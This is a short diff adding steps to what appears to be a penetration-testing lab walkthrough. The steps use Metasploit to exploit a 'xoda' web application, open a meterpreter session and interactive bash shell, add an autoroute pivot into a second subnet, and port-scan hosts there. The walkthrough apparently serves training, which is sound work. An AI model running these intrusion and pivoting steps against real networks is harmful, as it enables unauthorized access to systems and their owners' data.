@@ -119,6 +119,43 @@ We need to specify the path of the webApp:
 
 msf6:`set targeturi /`
 
+msf6:`show options`
+
+msf6:`exploit`
+
+meterpreter:`sysinfo`
+
+meterpreter:`shell`
+
+`/bin/bash -i`
+
+shell:`ifconfig`
+
+eth1 is in the target 2 subnet (change 2 to 3)
+
+clear out
+
+We add the route (We will be able to perform the scan):
+
+meterpreter:`run autoroute -s [eth1]`
+
+meterpreter:`background`
+
+msf6 xoda exploit:`search portscan`
+
+msf6 xoda exploit:`use portscan`
+
+msf6 xoda exploit:`set rhosts [target2 IP]`
+
+msf6 xoda exploit:`show options`
+
+msf6 xoda exploit:`run`
+
+
+
+
+
+
 
 
 
